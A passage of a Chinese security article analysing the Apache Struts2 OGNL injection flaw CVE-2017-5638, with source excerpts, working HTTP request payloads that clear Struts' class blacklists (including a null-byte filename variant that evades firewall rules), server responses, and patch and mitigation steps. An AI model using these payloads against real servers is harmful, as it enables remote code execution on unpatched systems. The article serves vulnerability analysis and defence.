p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;o;161:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}162:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};163:164:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TextParser&nbsp;parser&nbsp;=&nbsp;((Container)stack.getContext().get(ActionContext.CONTAINER)).getInstance(TextParser.class);165:166:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;parser.evaluate(openChars,&nbsp;expression,&nbsp;ognlEval,&nbsp;maxLoopCount);167:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>有了这个最后一个方法调用，我们就可以跟踪到用户输入的异常消息，一直到OGNL的评估。</p>
<p>大家可能会非常想知道漏洞的有效载荷是如何工作的。首先，我们尝试提供一个返回附加标题的简单OGNL有效载荷。我们需要在开头包含未使用的变量，以便Dispatcher检查“multipart / form-data”子串，并将我们的请求解析成文件上传。</p>
<p>用户输入要求：</p>
<pre class="brush:html;toolbar:false;">POST&nbsp;/struts2-showcase/fileupload/doUpload.action&nbsp;HTTP/1.1
Host:&nbsp;localhost:8080
User-Agent:&nbsp;Mozilla/5.0&nbsp;(Macintosh;&nbsp;Intel&nbsp;Mac&nbsp;OS&nbsp;X&nbsp;10.12;&nbsp;rv:52.0)&nbsp;Gecko/20100101&nbsp;Firefox/52.0
Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:&nbsp;en-US,en;q=0.5
Accept-Encoding:&nbsp;gzip,&nbsp;deflate
Content-Type:&nbsp;${(#_=&#039;multipart/form-data&#039;).(#context[&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;].addHeader(&#039;X-Struts-Exploit-Test&#039;,&#039;GDSTEST&#039;))}
Content-Length:&nbsp;0</pre>
<p>用户输入反应：</p>
<pre class="brush:html;toolbar:false;">HTTP/1.1&nbsp;200&nbsp;OK
Set-Cookie:&nbsp;JSESSIONID=1wq4m7r2pkjqfak2zaj4e12kn;Path=/struts2-showcase
Expires:&nbsp;Thu,&nbsp;01&nbsp;Jan&nbsp;1970&nbsp;00:00:00&nbsp;GMT
Content-Type:&nbsp;text/html
[..snip..]</pre>
<p>用户登录异常：</p>
<pre class="brush:html;toolbar:false;">17-03-24&nbsp;12:48:30,904&nbsp;WARN&nbsp;&nbsp;[qtp18233895-25]&nbsp;ognl.SecurityMemberAccess&nbsp;(SecurityMemberAccess.java:74)&nbsp;-&nbsp;Package&nbsp;of&nbsp;target&nbsp;[com.opensymphony.sitemesh.webapp.ContentBufferingResponse@9f1cfe2]&nbsp;or&nbsp;package&nbsp;of&nbsp;member&nbsp;[public&nbsp;void&nbsp;javax.servlet.http.HttpServletResponseWrapper.addHeader(java.lang.String,java.lang.String)]&nbsp;are&nbsp;excluded!</pre>
<p>事实证明，Struts提供了类成员访问的黑名单功能即类方法。默认情况下，使用以下类列表和正则表达式：</p>
<pre class="brush:html;toolbar:false;">core/src/main/resources/struts-default.xml:41:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;constant&nbsp;name=&quot;struts.excludedClasses&quot;42:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value=&quot;43:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.Object,44:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.Runtime,45:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.System,46:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.Class,47:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.ClassLoader,48:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.Shutdown,49:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.ProcessBuilder,50:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ognl.OgnlContext,51:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ognl.ClassResolver,52:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ognl.TypeConverter,53:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ognl.MemberAccess,54:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ognl.DefaultMemberAccess,55:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;com.opensymphony.xwork2.ognl.SecurityMemberAccess,56:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;com.opensymphony.xwork2.ActionContext&quot;&gt;57:&nbsp;[..snip..]63:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;constant&nbsp;name=&quot;struts.excludedPackageNames&quot;&nbsp;value=&quot;java.lang.,ognl,</pre>
<p>为了更好地了解原始的OGNL有效载荷，让我们尝试一个实际样本的载荷过程：</p>
<p>载荷要求：</p>
<pre class="brush:html;toolbar:false;">POST&nbsp;/struts2-showcase/fileupload/doUpload.action&nbsp;HTTP/1.1
Host:&nbsp;localhost:8080
User-Agent:&nbsp;Mozilla/5.0&nbsp;(Macintosh;&nbsp;Intel&nbsp;Mac&nbsp;OS&nbsp;X&nbsp;10.12;&nbsp;rv:52.0)&nbsp;Gecko/20100101&nbsp;Firefox/52.0
Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:&nbsp;en-US,en;q=0.5
Accept-Encoding:&nbsp;gzip,&nbsp;deflate
Content-Type:&nbsp;${(#_=&#039;multipart/form-data&#039;).(#container=#context[&#039;com.opensymphony.xwork2.ActionContext.container&#039;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context[&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;].addHeader(&#039;X-Struts-Exploit-Test&#039;,&#039;GDSTEST&#039;))}}
Content-Length:&nbsp;0</pre>
<p>载荷效果：</p>
<pre class="brush:html;toolbar:false;">HTTP/1.1&nbsp;200&nbsp;OK
Set-Cookie:&nbsp;JSESSIONID=avmifel7x66q9cmnsrr8lq0s;Path=/struts2-showcase
Expires:&nbsp;Thu,&nbsp;01&nbsp;Jan&nbsp;1970&nbsp;00:00:00&nbsp;GMT
X-Struts-Exploit-Test:&nbsp;GDSTEST
Content-Type:&nbsp;text/html
[..snip..]</pre>
<p>我们可以看到，这确实有效。但是如何绕过我们之前看到的黑名单呢？</p>
<p>这个有效载荷是空的排除包名称和类的列表，从而使黑名单无用。它首先通过获取与OGNL上下文相关联的当前容器并将其分配给容器变量来实现。大家可能会注意到com.opensymphony.xwork2.ActionContext类包含在上面的黑名单中。那既然这样，怎么会躲避黑名单的捕获呢，因为我们没有引用类成员，而是通过OGNL值堆栈中已经存在的密钥（在core/src/main/java/com/opensymphony/xwork2/ActionContext.java:102中定义的）。我们的有效载荷已经利用了这个类的一个实例引用。</p>
<p>接下来，有效载荷获取容器的OgnlUtil实例允许我们调用返回当前排除的类和包名称的方法。最后一步是简单地清除每个黑名单并执行我们想要的任何无限制的评估。</p>
<p>一旦黑名单被清空，有效载荷也变空了，直到被代码覆盖和应用程序重新启动。我们还发现了一个常见的测试陷阱，当我们试图重现在野外发现的某些有效载荷或记录时，有些有效载荷无法工作，因为它们已经假设黑名单已经被清空，这可能是以前在不同有效载荷的测试期间发生的。这充分说明了运行动态测试时重置应用程序状态的重要性。</p>
<p>大家可能还注意到，使用的原始漏洞利用的有效载荷比我们所列举的样本有点复杂。比如，为什么会执行额外的步骤，例如检查_memberAccess变量并调用名为setMemberAccess的方法？我们猜想可能是尝试利用另一种技术来清除黑名单，以防第一种技术不起作用。使用MemberAcess类的默认实例调用setMemberAccess方法，该实例实际上也会清除黑名单。所以我们可以确认这种技术会在Struts 2.3.31中工作，而不是Struts 2.5.10。不过目前，我仍然不确定三元运算符的目的是检查和有条件地分配_memberAccess。在测试期间，我们没有观察到这个变量的评估。</p>
<p>从2.5.10开始，存在针对CVE-2017-5638的其他漏洞利用，这是因为任何不具有关联错误密钥的用户输入的异常消息将都被评估为OGNL。例如，提供带有空字节的上传文件名将导致从Apache commons fileupload库中抛出InvalidFileNameException异常。这也将绕过检查内容类型标头的Web应用程序防火墙规则，以下请求中的％00应首先进行URL解码，结果为用户输入的异常消息。</p>
<p>用户输入要求：</p>
<pre class="brush:html;toolbar:false;">POST&nbsp;/struts2-showcase/&nbsp;HTTP/1.1
Host:&nbsp;localhost:8080
Content-Type:&nbsp;multipart/form-data;&nbsp;boundary=---------------------------1313189278108275512788994811
Content-Length:&nbsp;570

-----------------------------1313189278108275512788994811
Content-Disposition:&nbsp;form-data;&nbsp;name=&quot;upload&quot;;&nbsp;filename=&quot;a%00${(#container=#context[&#039;com.opensymphony.xwork2.ActionContext.container&#039;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context[&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;].addHeader(&#039;X-Struts-Exploit-Test&#039;,&#039;GDSTEST&#039;))}”
Content-Type:&nbsp;text/html

test
-----------------------------1313189278108275512788994811--</pre>
<p>用户输入反应：</p>
<pre class="brush:html;toolbar:false;">HTTP/1.1&nbsp;404&nbsp;No&nbsp;result&nbsp;defined&nbsp;for&nbsp;action&nbsp;com.opensymphony.xwork2.ActionSupport&nbsp;and&nbsp;result&nbsp;input
Set-Cookie:&nbsp;JSESSIONID=hu1m7hcdnixr1h14hn51vyzhy;Path=/struts2-showcase
X-Struts-Exploit-Test:&nbsp;GDSTEST
Content-Type:&nbsp;text/html;charset=ISO-8859-1
[..snip..]</pre>
<p>用户登录异常：</p>
<pre class="brush:html;toolbar:false;">2017-03-24&nbsp;15:21:29,729&nbsp;WARN&nbsp;&nbsp;[qtp1168849885-26]&nbsp;multipart.JakartaMultiPartRequest&nbsp;(JakartaMultiPartRequest.java:82)&nbsp;-&nbsp;Unable&nbsp;to&nbsp;parse&nbsp;request
org.apache.commons.fileupload.InvalidFileNameException:&nbsp;Invalid&nbsp;file&nbsp;name:&nbsp;a${(#container=#context[&#039;com.opensymphony.xwork2.ActionContext.container&#039;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context[&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;].addHeader(&#039;X-Struts-Exploit-Test&#039;,&#039;GDSTEST&#039;))}
	at&nbsp;org.apache.commons.fileupload.util.Streams.checkFileName(Streams.java:189)&nbsp;~[commons-fileupload-1.3.2.jar:1.3.2]
	at&nbsp;org.apache.commons.fileupload.disk.DiskFileItem.getName(DiskFileItem.java:259)&nbsp;~[commons-fileupload-1.3.2.jar:1.3.2]
	at&nbsp;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.processFileField(JakartaMultiPartRequest.java:105)&nbsp;~[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.processUpload(JakartaMultiPartRequest.java:96)&nbsp;~[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse(JakartaMultiPartRequest.java:67)&nbsp;[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper.(MultiPartRequestWrapper.java:86)&nbsp;[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.Dispatcher.wrapRequest(Dispatcher.java:806)&nbsp;[struts2-core-2.5.10.jar:2.5.10]</pre>
<p>通过查看stacktrace可以看到，控制流在JakartaMultiPartRequest类的processUpload方法中发生偏差。当在第91行调用parseRequest方法时抛出异常，而不是在调用processFileField方法并获取105行文件项的名称时抛出异常：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java:90:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;void&nbsp;processUpload(HttpServletRequest&nbsp;request,&nbsp;String&nbsp;saveDir)&nbsp;throws&nbsp;FileUploadException,&nbsp;UnsupportedEncodingException&nbsp;{91:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(FileItem&nbsp;item&nbsp;:&nbsp;parseRequest(request,&nbsp;saveDir))&nbsp;{92:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.debug(&quot;Found&nbsp;file&nbsp;item:&nbsp;[{}]&quot;,&nbsp;item.getFieldName());93:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(item.isFormField())&nbsp;{94:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processNormalFormField(item,&nbsp;request.getCharacterEncoding());95:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{96:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processFileField(item);97:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}98:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}99:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}[..snip..]101:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;void&nbsp;processFileField(FileItem&nbsp;item)&nbsp;{102:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.debug(&quot;Item&nbsp;is&nbsp;a&nbsp;file&nbsp;upload&quot;);103:&nbsp;104:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Skip&nbsp;file&nbsp;uploads&nbsp;that&nbsp;don&#039;t&nbsp;have&nbsp;a&nbsp;file&nbsp;name&nbsp;-&nbsp;meaning&nbsp;that&nbsp;no&nbsp;file&nbsp;was&nbsp;selected.105:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(item.getName()&nbsp;==&nbsp;null&nbsp;||&nbsp;item.getName().trim().length()&nbsp;&lt;&nbsp;1)&nbsp;{106:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.debug(&quot;No&nbsp;file&nbsp;has&nbsp;been&nbsp;uploaded&nbsp;for&nbsp;the&nbsp;field:&nbsp;{}&quot;,&nbsp;item.getFieldName());107:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;108:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}109:&nbsp;110:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&lt;FileItem&gt;&nbsp;values;111:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(files.get(item.getFieldName())&nbsp;!=&nbsp;null)&nbsp;{112:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;values&nbsp;=&nbsp;files.get(item.getFieldName());113:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{114:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;values&nbsp;=&nbsp;new&nbsp;ArrayList&lt;&gt;();115:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}116:&nbsp;117:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;values.add(item);118:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;files.put(item.getFieldName(),&nbsp;values);119:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p><span style="font-size: 20px"><strong>总结</strong></span></p>
<p>我们从这项研究中得到的一个收获就是，不能总是依赖于查看CVE描述来了解漏洞的工作原理。比如，CVE-2017-5638存在的可能原因是因为文件上传时，拦截器尝试使用评估OGNL的潜在危险函数来解决错误消息。因此，这不是Jakarta请求包装器的问题，正如CVE描述的那样，但是文件上传时拦截器信任该异常的消息将不会被用户输入。</p>
<p><strong>检测与修复方案</strong></p>
<p>如果您的设备已经检测出存在Struts2漏洞，根据您的具体情况有以下三种解决方式：</p>
<p>1.官方解决方案</p>
<p>官方已经发布版本更新，尽快升级到不受影响的版本（Struts 2.3.32或Struts 2.5.10.1），建议在升级前做好数据备份。</p>
<p>Struts 2.3.32 下载<a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32" target="_self">地址</a>，</p>
<p>Struts 2.5.10.1下载<a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1" target="_self">地址</a>。</p>
<p>2.临时修复方案</p>
<p>在用户不便进行升级的情况下，作为临时的解决方案，用户可以进行以下操作来规避风险：</p>
<p>在WEB-INF/classes目录下的struts.xml 中的struts 标签下添加</p>
<pre class="brush:html;toolbar:false">&lt;constant&nbsp;name=&quot;struts.custom.i18n.resources&quot;&nbsp;value=&quot;global&quot;&nbsp;/&gt;</pre>
<p>在WEB-INF/classes/ 目录下添加 global.properties，文件内容如下：</p>
<pre class="brush:html;toolbar:false">struts.messages.upload.error.InvalidContentTypeException=1</pre>
<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170405/1491382285843185.png" title="1491382285843185.png" alt="360反馈意见截图16241228788858.png" /><noscript><img src="/uploads/20170405/1491382285843185.png" title="1491382285843185.png" alt="360反馈意见截图16241228788858.png" /></noscript></p>
<p>配置过滤器过滤Content-Type的内容，在web应用的web.xml中配置过滤器，在过滤器中对Content-Type内容的合法性进行检测：</p>
<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170405/1491382293201650.png" title="1491382293201650.png" alt="360反馈意见截图16341027108112114.png" /><noscript><img src="/uploads/20170405/1491382293201650.png" title="1491382293201650.png" alt="360反馈意见截图16341027108112114.png" /></noscript></p>
                <div class="foot_description" style="background-color: #fff;">
                    本文参考来源于blog.gdssecurity，如若转载，请注明来源于嘶吼：                        <a href="http://www.4hou.com/technology/4109.html" target=_blank>http://www.4hou.com/technology/4109.html</a>
                                    </div>


                 </p>
            </div>
            <div class="article_con">
                <!--文章内容-->
            </div>
            <div class="post-like">
                <a href="javascript:;" data-action="ding" target=_blank data-id="4109" class="favorite">
                <div class="zanbox">
                    <dd class="zanbefor"></dd>
                    <dd class="zanafter"></dd>
                </div>
                <span class="zantext">点赞</span>
                <span class="count">
            0</span>
                </a>
            </div>
            <div class="active_bottom">
                <ul>
                    <a class="Sina" href="http://service.weibo.com/share/share.php?url=http://www.4hou.com/technology/4109.html" title="分享到新浪微博" target="_blank"><li class="sinahover"></li></a>
                    <a onclick="window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+encodeURIComponent(document.location.href));return false;" title="分享到QQ空间" class="WeChat" href="javascript:void(0)" target="_blank"><li class="kj"></li></a>
                    <a onclick="dashangToggle()" class="friend" title="分享到微信、朋友圈等" target="_blank"><li class="wx"></li></a>

                </ul>
                <div class="strat icons"><span class='wpfp-span'><img src='http://img.4hou.com/wp-content/plugins/wp-favorite-posts/img/star.png' alt='Favorite' title='Favorite' class='wpfp-img' /><a class='wpfp-link' href='?wpfpaction=add&amp;postid=4109' title='收藏' rel='nofollow'>收藏</a></span></div>
                <div class="hide_box"></div>
                <div class="shang_box">
                    <a class="shang_close" href="javascript:void(0)" onClick="dashangToggle()" title="关闭"><img src="http://img.4hou.com/wp-content/themes/4houv2/images/close.jpg" alt="取消" /></a>
                    <img class="shang_logo" width="120px" src="http://img.4hou.com/wp-content/themes/4houv2/images/logo.png" alt="嘶吼" />
                    <div class="shang_tit">
                        <p>感谢您的支持，我会继续努力的!</p>
                    </div>
                    <div class="shang_payimg">
                        <img src="http://www.4hou.com/wp-content/themes/4houv2/qrcode.php?url=http%3A%2F%2Fwww.4hou.com%2Ftechnology%2F4109.html" alt="扫码支持" title="扫一扫" />
                    </div>

                    <div class="shang_info">
                        <p>打开<span id="shang_pay_txt">微信</span>扫一扫后点击右上角即可分享哟</p>
                    </div>
                </div>
            </div>
            
            <div class="avatarbottomwrap">
                 <div class="avatarboxleft">
                        <div class="avatarbottom">
                           
                            <a class="upload-img"><img alt='xiaohui' src='http://img.4hou.com/wp-content/uploads/2017/06/4645ece03f124d9c2bb9-96x96.png' class='avatar avatar-96 photo' height='96' width='96' /></a>
                        </div>
                        <h1 class="authornamebottom"><a href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
                                xiaohui                                                            <i class="mem_level"></i>
                             </a></h1>
                        <p class="authorzybottom">嘶吼编辑</p>

                        <div class="authorbottombox">
                            <!--<div class="gzbtn">关注</div>
                            <div class="sxbtn">私信</div>-->
                                                            <span class="gzbtn"  style="cursor: pointer;" onclick="location.href='/mybox?action=reply&to_user=xiaohui&type=send'">发私信</span>
                                                    </div>
                 </div>
                <div class="authorother">
                 <a class="morearticle" href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                             </a>
                    <div class="swiper-container">

                                                    <div class="swiper-wrapper">
                               
                                <div class="swiper-slide">
                                                                        <div><a href="http://www.4hou.com/technology/7667.html" target=_blank>
                                            <img data-original="/uploads/20170915/1505460611763833.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/technology/7638.html" target=_blank>
                                            <img data-original="http://img.4hou.com/wp-content/uploads/2017/09/dcf441e3e17ab9ef68ff.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/technology/7657.html" target=_blank>
                                            <img data-original="/uploads/20170915/1505404839986320.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/technology/7600.html" target=_blank>
                                            <img data-original="/uploads/20170908/1504854270386868.png?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                    </div>
                            </div>
                                        </div>
                </div>
                <script type="text/javascript">
                    function dashangToggle(){
                        $(".hide_box").fadeToggle();
                        $(".shang_box").fadeToggle();
                    }
                </script>
                <script> 
                    var mySwiper = new Swiper('.swiper-container', {
                        direction : 'vertical',
                        pagination : '.swiper-pagination',
                        paginationClickable :true,
                        spaceBetween : 20
                    })
                </script>
            </div>
                            <div class="review" style="margin-bottom:80px;">
    <h3 id="reply-title" class="comment-reply-title">发表评论 <small></h3>
    <form action="http://www.4hou.com/wp-comments-post.php" method="post" id="commentform">
        <p class="commentname"><label for="author">昵称</label>
            <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p>
        <p class="commenteml">
            <label for="email">邮箱</label>
            <input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required />
        </p>
        <p class="comment-form-comment">
           <label for="comment">评论</label>
           <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea>
        </p>

        <p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="发表评论" />
        <input type='hidden' name='comment_post_ID' value="4109" id='comment_post_ID' />
            <input type='hidden' name='comment_parent' id='comment_parent' value='0' />
        </p>
    </form>
					
<div class="new-review">
   <ol class="commentlist">
   <div class="comment-box" id="li-comment-780">
    <div class="avatar fl"><img alt='高坂穗乃果' src='http://img.4hou.com/wp-content/uploads/2017/06/bfa6e5e55d7648b4a977-120x120.jpg' class='avatar avatar-120 photo' height='120' width='120' /></div>
    <!--评论列表-->
    <div class="user-comment">
    <!--评论人-->
  <a id="c-man" href="http://www.4hou.com/member?Author=%E9%AB%98%E5%9D%82%E7%A9%97%E4%B9%83%E6%9E%9C" class="nick">高坂穗乃果</a>
  <!--评论时间-->
  <span>2017-04-06 15:39</span>
  <!--评论内容-->
<p>感谢分享</p>
  <!--回复按钮-->
  <div class="reply clearfix">
<a rel='nofollow' class='comment-reply-link' href='http://www.4hou.com/technology/4109.html?replytocom=780#respond' onclick='return addComment.moveForm( "comment-780", "780", "respond", "4109" )' aria-label='回复给高坂穗乃果'>回复</a>  </div>
  </div>
<script>
  $("#replybtn").click(function(){
     $("#ta").text("");
     $("#comment").focus();
  })
</script>
  <!--评论审核提示-->
  <div class="comment_text">
  </div>
</div>
</li><!-- #comment-## -->
   </ol>
   <div class="hr clearfix">&nbsp;</div>
</div>
</div>             
        </article>

        <!--作者其他文章-->
        <aside class="article_authorbox">
          <div class="article_authorbox_top">
                <div class="article_author">
            <div class="article_author_avatar">
                 <a class="upload-img"><img alt='xiaohui' src='http://img.4hou.com/wp-content/uploads/2017/06/4645ece03f124d9c2bb9-96x96.png' class='avatar avatar-96 photo' height='96' width='96' /></a>
            </div>
            <h1 class="article_author_name"><a href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
                    xiaohui                                    <i class="mem_level"></i>
                </a></h1>
            <p class="article_author_type">嘶吼编辑 </p>
            <div class="article_author_bottom">
                                        <span class="send-info" onclick="location.href='/mybox?action=reply&to_user=xiaohui&type=send'">发私信</span>
                         
            </div>
          </div>  
            <div class="interested">
                <h1>可能喜欢</h1>
                                                    <li>
                    <i></i>
                    <a href="http://www.4hou.com/technology/7667.html" target="_blank">小心找工作时被挖坑，有人利用 LinkedIn 发送钓鱼链接</a> 
                </li> 
                                <li>
                    <i></i>
